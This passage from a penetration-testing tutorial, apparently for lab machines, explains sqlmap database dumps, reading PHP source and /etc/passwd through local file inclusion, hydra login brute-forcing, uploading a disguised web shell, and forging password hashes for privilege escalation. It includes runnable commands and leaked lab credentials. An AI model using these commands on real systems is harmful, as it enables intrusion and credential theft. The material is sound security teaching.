     attacker measures **response delay** instead. The giveaway is that the request took
     ~5 seconds longer. Use this when there is no visible difference at all.
   - **`UNION query`** — `… UNION ALL SELECT NULL,NULL,CONCAT(0x71,…),NULL,NULL-- -`.
     The attacker appends their own `SELECT` to yours and the results are **printed on
     the page**. This is the fastest and most direct: `target URL appears to have 5
     columns` means it worked out the column count, and `CONCAT(0x71,…)` builds a marker
     string so it can find its own output among the page's.
   - **`-- -`** at the end is a **SQL comment** (`--` plus a space, written `-- -` to
     survive shell/HTTP mangling). It truncates the rest of the original query so your
     syntax is not broken by what followed.
7. `with a total of 214 HTTP(s) requests` — how noisy that run was. **214 requests are
   214 log lines.** On a real system this is what an IDS sees.
8. `Do you want to keep testing the others (if any)? [y/N]` — with `--batch` this is
   answered `N` automatically.

**Then dump it:**

```bash
sqlmap -u "…" --forms --batch -D cengbox -T admin --dump
```

```text
Database: cengbox
Table: admin
[2 entries]
+----+-------------+----------------+
| id | username    | password       |
+----+-------------+----------------+
| 1  | masteradmin | C3ng0v3R00T1!  |
| 2  | guest       | guest          |
+----+-------------+----------------+
```

`password` here is `varchar(64)` **plaintext** — no `$2b$`, no 32-hex string. That is a
worse finding than a weak hash, because there is nothing to crack: the secret is simply
in the database.

---

### 10.7 `php://filter` — reading PHP source through an LFI

```bash
curl "http://TARGET/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
```

```text
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

**Why it is needed.** `?page=config` makes PHP *include* `config.php`, so PHP executes
it and you see the **rendered result** — usually a blank page, because the file only
defines variables. You want the **source**. `php://filter/convert.base64-encode/` is a
**stream wrapper** that runs the file through an encoder *before* handing it to
`include()`, so what arrives in your browser is base64 text — the source, safely
encoded. `base64 -d` reverses it locally.

| Part | Meaning |
| --- | --- |
| `php://filter` | the stream wrapper that applies filters to a stream |
| `convert.base64-encode` | the filter: encode as base64. (`convert.base64-decode`, `string.rot13`, `convert.iconv.*` also exist) |
| `resource=config` | the file to wrap. Note the application appends `.php` itself, giving `config.php` — harmless because the wrapper sits in front |

**Reading it.** Any `<?php … ?>` you get back is the real source. Look immediately for:
`$password`, `define('DB_PASSWORD', …)`, `include`, `system`, `exec`, `unserialize`,
`$_GET`/`$_POST` reaching a dangerous function, and hard-coded API keys. Machine 10's
entire foothold comes from this one command.

**Confirming plain LFI first:**

```bash
curl "http://TARGET/?page=../../../../etc/passwd"
```
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Seven colon-separated fields: **name : password-placeholder : UID : GID : comment :
home : shell**. `x` means "the real hash is in `/etc/shadow`". UID `0` is root by
definition. `/usr/sbin/nologin` means that account cannot log in interactively — so
`www-data` is a service account. **If you can read this file, your LFI is confirmed**;
everything else is a question of which other files matter.

---

### 10.8 `hydra` against a web form

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f \
  192.168.56.104 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is possible)

[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344391 login tries (l:1/p:14344391), ~3586098 tries per task
[DATA] attacking http-post-form://192.168.56.104:80/wp-login.php
[STATUS] 3122.00 tries/min, 3122 tries in 00:01h, 14341269 to do in 76h:35m, 4 active
[80][http-post-form] host: 192.168.56.104   login: admin   password: password123
[STATUS] attack finished for host 192.168.56.104 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

**The input**

| Token | Meaning |
| --- | --- |
| `-l admin` | one **l**ogin name. `-L file` for a list |
| `-P rockyou.txt` | a **P**assword file. `-p word` for one |
| `-C file` | colon-separated `user:pass` **pairs** — credential stuffing |
| `-t 4` | 4 parallel tasks. Higher is faster and *much* noisier; on old VMs it also causes failures that look like "wrong password" |
| `-f` | **stop at the first success.** Without it hydra keeps going through the entire list |
| `-e nsr` | additionally try **n**ull password, **s**ame-as-username, **r**eversed username. Costs nothing, hits surprisingly often |
| `-V` | verbose: print every attempt |
| `192.168.56.104` | the host |
| `http-post-form` | the **service module**. Getting this wrong is the most common hydra mistake — it must match the protocol |

**The `http-post-form` argument is one string with three colon-separated parts:**

```text
"/wp-login.php : log=^USER^&pwd=^PASS^&wp-submit=Log+In : F=incorrect"
     PATH              POST BODY                          FAILURE MARKER
```

- **PATH** — where to POST.
- **BODY** — the form fields, with `^USER^` and `^PASS^` as placeholders hydra fills in.
  Copy it from a real login attempt (browser dev tools, or `curl -i -d`). Include hidden
  fields like `wp-submit` or CSRF tokens, or the server rejects every attempt for a
  reason unrelated to the password.
- **`F=incorrect`** — a string that appears **only on failure**. hydra marks a try as
  successful when that string is *absent*. Alternatively `S=Welcome` for a string that
  appears only on success. **Find it by logging in wrongly once and reading the HTML.**
  A wrong marker produces either zero hits or a hit on the very first try — both are
  symptoms of a bad `F=`/`S=`.

**Reading the output**

1. `[DATA] max 4 tasks … 14344391 login tries` — the plan: 14.3 million attempts.
   `~3586098 tries per task` is that divided by threads.
2. `[STATUS] 3122.00 tries/min … 14341269 to do in 76h:35m` — **the rate and the
   remaining time.** This line is the argument for targeted wordlists: 76 hours with
   `rockyou` over HTTP, versus seconds with a 100-word `cewl` list.
3. `[80][http-post-form] host: … login: admin password: password123` — **the hit.**
   `[80]` is the port, then the module, host and the working pair.
4. `1 of 1 target successfully completed, 1 valid password found` — the summary.
   `0 valid password found` with no error means the credentials genuinely were not in
   the list (or your failure marker was wrong).

---

### 10.9 `curl -F` — uploading a file by hand

```bash
curl -s -i -b cookies.txt -X POST 'http://TARGET:8000/admin/api/0.2.3/import/content/upload' \
  -F 'files[]=@shell.php.jpg;type=image/jpeg'
```

```text
HTTP/1.1 201 Created
Date: Sat, 11 May 2024 12:04:19 GMT
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.17
Content-Length: 214
Content-Type: application/json

{"entry":{"id":"b1c2","filename":"shell.php.jpg","type":"image","path":"storage/originals/07/11/b1c2/shell.php.jpg"}}
```

**The input**

| Token | Meaning |
| --- | --- |
| `-F 'name=@file'` | **multipart/form-data** upload. `@` means "read this from disk"; without it you send the literal text `shell.php.jpg` |
| `files[]` | the field name the server expects — copy it exactly from the form's HTML (`<input type="file" name="files[]">`) |
| `;type=image/jpeg` | override the MIME type sent for that part. This is how you satisfy a naive `$_FILES['x']['type']` check |
| `-b cookies.txt` | send the admin session you captured earlier |

**Reading the output**

1. **`201 Created`** — the upload succeeded *and* a new resource was created. `200` would
   also be fine; `400`/`415` mean the server rejected it (415 = unsupported media type).
2. `X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.17` — exact PHP and OS patch level, for free.
3. **The JSON body is the prize:** `"path":"storage/originals/07/11/b1c2/shell.php.jpg"`
   tells you *exactly where the file was stored*. You did not have to guess. Build the
   URL: `http://TARGET:8000/storage/originals/07/11/b1c2/shell.php.jpg`.
4. If the response does **not** disclose the path, fall back to the framework's
   conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`, `/uploads/`) or
   brute-force the directory with `ffuf`.

**Why a proxy is sometimes better.** In Machine 11 the extension is checked in
JavaScript, so the browser refuses to send `shell.php`. Burp Suite intercepts the
request *after* the browser builds it and lets you rename the field to `shell.php`
before forwarding — something `curl` can also do, but where Burp shows you the whole
request. Use `curl` when you know the request; use Burp when you need to *see* it.

---

### 10.10 `base64`, `md5sum`, `openssl passwd` — the small utilities that decide labs

```bash
printf '%s' 'YWRtaW46cGFzc3dvcmQ=' | base64 -d; echo
printf '%s' 'admin:password' | base64; echo
md5sum shell.php
openssl passwd -1 -salt ignite superpassword
```

```text
admin:password
YWRtaW46cGFzc3dvcmQ=
9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c  shell.php
$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0
```

| Command | What it does | Reading the result |
| --- | --- | --- |
| `base64 -d` | **decode**. `-w 0` on the encode side means "no line wrapping" | Output ending in garbage usually means the input had whitespace or was not really base64 |
| `base64` (no `-d`) | **encode** | Trailing `=` is padding; length is always a multiple of 4 |
| `md5sum FILE` | 128-bit integrity digest | `<32 hex>  <filename>` — two spaces. Compare across machines to prove a transfer was intact |
| `openssl passwd -1` | generate an **MD5-crypt** hash (`$1$`) | Format is `$1$<salt>$<hash>`. `-5` gives SHA-256-crypt, `-6` SHA-512-crypt |

**`printf '%s'` rather than `echo`.** `echo 'x' | base64` appends a **newline** before
encoding, so decoding gives you an extra blank line and byte-exact comparisons fail.
`printf '%s'` writes exactly the bytes you asked for. `echo` is fine for human reading;
`printf` is correct for anything you will compare.

**Why `openssl passwd` matters.** Machine 1's escalation needs a *valid* hash to put in
`/etc/passwd`. You never invent one and never copy one from a writeup whose salt you
cannot verify — you generate it, and you **single-quote** it afterwards, because `$1$`
and `$P$` are shell variables and an unquoted hash is silently truncated to nothing.

---

### 10.11 `whatweb` — fingerprint the whole stack in one request

```bash
whatweb -a 3 http://TARGET/
```

```text
http://192.168.56.104/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ],
HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.56.104],
PHP[5.5.9-1ubuntu4.14], Title[My Blog], UncommonHeaders[x-powered-by],
X-Powered-By[PHP/5.5.9-1ubuntu4.14]
```

`-a 3` is **aggression level 3** (1 = stealthy, one request; 4 = everything including
subpages). The output is a comma-separated list of `Plugin[Detail]` pairs. Read it as a
shopping list: `Apache[2.4.29]` + `PHP[5.5.9-1ubuntu4.14]` together pin the
distribution to **Ubuntu 14.04**, which pins the kernel series, which is what you feed
to `searchsploit`. `UncommonHeaders[x-powered-by]` is whatweb telling you a header is
present that most sites suppress — i.e. a disclosure finding.

---

_Back to [Learning Path 1](README.md) · previous: [01 — Foundations](01-Foundations-Networking-and-Recon.md) · next: [03 — Service and Network Attacks](03-Service-and-Network-Attacks.md)._
